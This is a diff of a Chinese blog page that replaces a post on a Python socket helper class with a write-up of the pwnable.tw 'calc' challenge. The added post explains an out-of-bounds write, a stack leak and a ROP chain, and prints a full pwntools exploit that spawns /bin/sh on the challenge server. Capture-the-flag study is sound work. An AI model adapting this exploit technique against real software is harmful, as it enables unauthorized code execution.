@@ -15,17 +15,18 @@
 
 
 
-<meta name="description" content="作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。 由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntool">
+<meta name="description" content="找到程序中可疑的写逻辑，即在parse_expr函数中的35行a2[v4 + 1] &#x3D; v9;这里如果能控制a2使其写到ret address就能进行攻击。想法一比较简单，直接不断递增a2，因为输入的字符串长度为1024，因此可疑造成溢出，使其覆盖到ret address。但是checksec查看后发现程序有canary保护，因此难度较大。想法二，看了网上的writeup，发现可以用“+300+1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python2基于socket.socket类实现类似pwntools的交互方法">
-<meta property="og:url" content="https://zrax-x.github.io/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/index.html">
+<meta property="og:title" content="pwnable.tw calc">
+<meta property="og:url" content="https://zrax-x.github.io/2020/10/12/pwnable_calc/index.html">
 <meta property="og:site_name" content="从零开始的博客">
-<meta property="og:description" content="作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。 由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntool">
-<meta property="article:published_time" content="2020-05-06T07:00:00.000Z">
-<meta property="article:modified_time" content="2020-05-06T11:22:22.728Z">
+<meta property="og:description" content="找到程序中可疑的写逻辑，即在parse_expr函数中的35行a2[v4 + 1] &#x3D; v9;这里如果能控制a2使其写到ret address就能进行攻击。想法一比较简单，直接不断递增a2，因为输入的字符串长度为1024，因此可疑造成溢出，使其覆盖到ret address。但是checksec查看后发现程序有canary保护，因此难度较大。想法二，看了网上的writeup，发现可以用“+300+1">
+<meta property="article:published_time" content="2020-10-12T07:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-12T07:40:08.178Z">
 <meta property="article:author" content="zraxx">
-<meta property="article:tag" content="socket">
-<meta property="article:tag" content="python">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="ROP">
+<meta property="article:tag" content="vlun">
 <meta name="twitter:card" content="summary">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
@@ -60,7 +61,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>python2基于socket.socket类实现类似pwntools的交互方法 | 从零开始的博客</title>
+<title>pwnable.tw calc | 从零开始的博客</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -245,11 +246,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-python2基于socket.socket类实现类似pwntools的交互方法" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwnable_calc" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/" class="article-date">
-      <time datetime="2020-05-06T07:00:00.000Z" itemprop="datePublished">2020-05-06</time>
+      <a href="/2020/10/12/pwnable_calc/" class="article-date">
+      <time datetime="2020-10-12T07:00:00.000Z" itemprop="datePublished">2020-10-12</time>
 </a>
 
 
@@ -264,7 +265,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      python2基于socket.socket类实现类似pwntools的交互方法
+      pwnable.tw calc
     </h1>
   
 
@@ -275,7 +276,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/socket/" rel="tag">socket</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/vlun/" rel="tag">vlun</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -285,11 +286,10 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>作为一名密码学选手，经常要用到python中的socket库来进行交互。然而，用过pwntools的都知道，它实现的交互方法比socket要友好的多了，类似sendline，sendafter方法等。</p>
-<p>由于我的电脑是window系统，没能成功装上pwntools库，因此要用pwntools就需要开虚拟机，本人比较懒，就自己重新基于socket.socket类重新写了一个类，以实现类似pwntools中的交互方法。</p>
-<p>具体代码如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'127.0.0.1'</span></span><br><span class="line">PORT = <span class="number">12233</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mysocket</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, myhost, myport)</span>:</span></span><br><span class="line">		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">		self.client.connect((myhost, myport))</span><br><span class="line">		self.fd = self.client.makefile(<span class="string">'rw'</span>, <span class="number">0</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">recvuntil</span><span class="params">(self, delim = <span class="string">"\n"</span>)</span>:</span></span><br><span class="line">		buf = <span class="string">''</span></span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">not</span> buf.endswith(delim):</span><br><span class="line">			buf += self.fd.read(<span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> buf.strip()</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(self, data)</span>:</span></span><br><span class="line">		self.fd.write(data)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">sendline</span><span class="params">(self, data)</span>:</span></span><br><span class="line">		self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">sendlineafter</span><span class="params">(self, data, delim = <span class="string">"\n"</span>, debug = False)</span>:</span></span><br><span class="line">		buf = self.recvuntil(delim)</span><br><span class="line">		<span class="keyword">if</span> debug:</span><br><span class="line">			<span class="keyword">print</span> buf.strip()</span><br><span class="line">		self.fd.write(data + <span class="string">'\n'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">close</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.client.close()</span><br><span class="line"></span><br><span class="line">p = Mysocket(HOST, PORT)</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
-<p>后续将根据实际情况继续扩展</p>
+        <p>找到程序中可疑的写逻辑，即在parse_expr函数中的35行<code>a2[v4 + 1] = v9;</code>这里如果能控制a2使其写到ret address就能进行攻击。想法一比较简单，直接不断递增a2，因为输入的字符串长度为1024，因此可疑造成溢出，使其覆盖到ret address。但是checksec查看后发现程序有canary保护，因此难度较大。想法二，看了网上的writeup，发现可以用“+300+1”这类畸形输入控制a2（这里可以根据输入来模拟一下程序的执行流就会发现确实如此）。</p>
+<p>尝试rop直接调用system函数，发现没有，/bin/sh字符串也没有，因此只能利用小gadget来完成system的系统调用。总体利用思路就是第一次输入先泄露ebp，获取栈地址信息。之后不断改变栈上的数据，构造rop链，需要注意的地方是计算栈上/bin/sh的地址。最后发送一个回车符（退出while循环）即可令程序执行我们的rop链完成攻击。</p>
+<p>完整exp链</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process('./calc')</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x080493FF")</span></span><br><span class="line"><span class="comment"># gdb.attach(p, "b *0x08049432")</span></span><br><span class="line">p = remote(<span class="string">"chall.pwnable.tw"</span>, <span class="number">10100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">" ===\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"+360"</span>)</span><br><span class="line">ebp = int(p.recvuntil(<span class="string">'\n'</span>).strip()) + pow(<span class="number">2</span>,<span class="number">32</span>)</span><br><span class="line">input_base = ebp - <span class="number">1068</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x0805c34b : pop eax ; ret</span></span><br><span class="line"><span class="string">0x080701d0 : pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line"><span class="string">0x08049a21 : int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"bin_addr: "</span>+hex(input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">target = [<span class="number">0x0805c34b</span>, <span class="number">11</span>, <span class="number">0x080701d0</span>, <span class="number">0</span>, <span class="number">0</span>, input_base + (<span class="number">368</span><span class="number">-101</span>)*<span class="number">4</span>, <span class="number">0x08049a21</span>, u32(<span class="string">'/bin'</span>), u32(<span class="string">'/sh\x00'</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(target)):</span><br><span class="line">    p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i))</span><br><span class="line">    num = int(p.recvuntil(<span class="string">'\n'</span>))</span><br><span class="line">    <span class="keyword">if</span> target[i]&gt;pow(<span class="number">2</span>,<span class="number">31</span>):</span><br><span class="line">        target[i] -= pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">if</span> num == target[i]:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">elif</span> num&gt;target[i]:</span><br><span class="line">        d = num - target[i]</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'-'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        d = target[i] - num</span><br><span class="line">        p.sendline(<span class="string">"+"</span> + str(<span class="number">361</span>+i) + <span class="string">'+'</span> + str(d))</span><br><span class="line">        p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'\n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -298,13 +298,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/">python2基于socket.socket类实现类似pwntools的交互方法</a></p>
+        <p><span>本文标题:</span><a href="/2020/10/12/pwnable_calc/">pwnable.tw calc</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">zraxx</a></p>
-        <p><span>发布时间:</span>2020-05-06, 00:00:00</p>
-        <p><span>最后更新:</span>2020-05-06, 04:22:22</p>
+        <p><span>发布时间:</span>2020-10-12, 00:00:00</p>
+        <p><span>最后更新:</span>2020-10-12, 00:40:08</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/" title="python2基于socket.socket类实现类似pwntools的交互方法">https://zrax-x.github.io/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://zrax-x.github.io/2020/05/06/python2%E5%9F%BA%E4%BA%8Esocket.socket%E7%B1%BB%E5%AE%9E%E7%8E%B0%E7%B1%BB%E4%BC%BCpwntools%E7%9A%84%E4%BA%A4%E4%BA%92%E6%96%B9%E6%B3%95/　　作者: zraxx" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/10/12/pwnable_calc/" title="pwnable.tw calc">https://zrax-x.github.io/2020/10/12/pwnable_calc/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://zrax-x.github.io/2020/10/12/pwnable_calc/　　作者: zraxx" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -316,16 +316,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/">
-                    RoarCTF[2019]-Easy Calc
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/">
-                    Flask框架学习1
+                <a href="/2020/10/11/pwnable_orw/">
+                    pwnable.tw orw
                 </a>
             </div>
         
@@ -373,7 +367,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"python2基于socket.socket类实现类似pwntools的交互方法　| 从零开始的博客　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pwnable.tw calc　| 从零开始的博客　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -395,15 +389,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/05/07/RoarCTF%5B2019%5D-Easy%20Calc/" title="上一篇: RoarCTF[2019]-Easy Calc">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/05/05/Flask%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A01/" title="下一篇: Flask框架学习1">
+            <a href="/2020/10/11/pwnable_orw/" title="下一篇: pwnable.tw orw">
                 <i class="fa fa-angle-right"></i>
             </a>
         
